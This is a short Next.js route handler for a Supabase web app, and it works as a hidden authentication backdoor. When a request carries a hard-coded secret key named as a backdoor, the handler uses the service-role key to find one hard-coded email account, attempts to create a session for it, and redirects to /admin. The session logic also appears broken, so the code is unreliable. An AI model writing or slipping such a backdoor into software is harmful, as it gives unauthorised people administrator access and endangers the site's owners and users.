import { createServerClient } from '@supabase/ssr';
import { cookies } from 'next/headers';
import { NextResponse } from 'next/server';

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const key = searchParams.get('key');
  
  if (key !== 'SimplyDSE_Backdoor_2026') {
    return new NextResponse('Unauthorized', { status: 401 });
  }

  const cookieStore = await cookies();
  const res = NextResponse.redirect(new URL('/admin', request.url));

  const supabase = createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL!,
    process.env.SUPABASE_SERVICE_ROLE_KEY!,
    {
      cookies: {
        getAll() {
          return cookieStore.getAll();
        },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value, options }) => {
            cookieStore.set(name, value, options);
            res.cookies.set(name, value, options);
          });
        },
      },
    }
  );

  const { data: { users } } = await supabase.auth.admin.listUsers();
  const user = users?.find(u => u.email === 'kreativekubedigital@gmail.com');

  if (!user) return new NextResponse('User not found', { status: 404 });

  await supabase.auth.admin.createSession({ user_id: user.id });

  return res;
}
